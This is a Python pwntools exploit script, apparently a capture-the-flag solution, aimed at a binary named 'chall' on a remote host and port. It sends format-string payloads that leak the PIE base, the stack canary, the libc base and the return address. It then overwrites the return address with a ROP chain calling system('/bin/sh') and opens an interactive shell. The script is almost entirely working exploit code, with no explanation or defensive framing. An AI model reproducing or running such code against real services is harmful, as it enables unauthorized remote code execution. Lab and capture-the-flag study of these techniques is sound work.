from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '123.216.69.60'
PORT = 4448

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

while(1):
    r = start()

    payload = ''
    payload += '%'+str(0xb3)+'c'
    payload += '%35$hhn'
    payload += '|||%36$p'
    payload += '|||%39$p'
    payload += '|||%43$p'
    payload += '|||%40$p'
    payload += '|||'
    payload = payload.ljust(0xe8, 'A')
    payload += '\x28'
    r.sendafter('name?\n', payload)
    try:
        leak = r.recvuntil('name?\n')
        break
    except:
        r.close()


if args.D:
    debug(r, [0x121b, 0x1236])

pie = int(leak.split('|||')[1], 16) - 0x10e0
dbg('pie')
canary = int(leak.split('|||')[2], 16)
dbg('canary')
base = int(leak.split('|||')[3], 16) - 0x270b3
dbg('base')
ret = int(leak.split('|||')[4], 16) - 8
dbg('ret')

system = base + 0x55410
binsh = base + 0x1b75aa
rdi = base + 0x00026b72
rdi_p1 = base + 0x000276e9


value = system << 128 | binsh << 64 | rdi_p1
target = ret
print hex(value)
# offset 6
payload = ''

offset = 0
for i in range(4*3):
    c = ((value >> (i*16)) - offset) % 0x10000
    if c == 0:
        c = 0x10000
    payload += '%' + str(c) + 'c'
    payload += '%' + str(26+i) + '$hn'
    offset += c
payload = payload.ljust(0xa0, 'A')

for i in range(4*2):
    payload += p64(target + i*2)
for i in range(4):
    payload += p64(target+0x18 + i*2)

offset = len(payload)
r.send(payload)

r.interactive()
r.close()
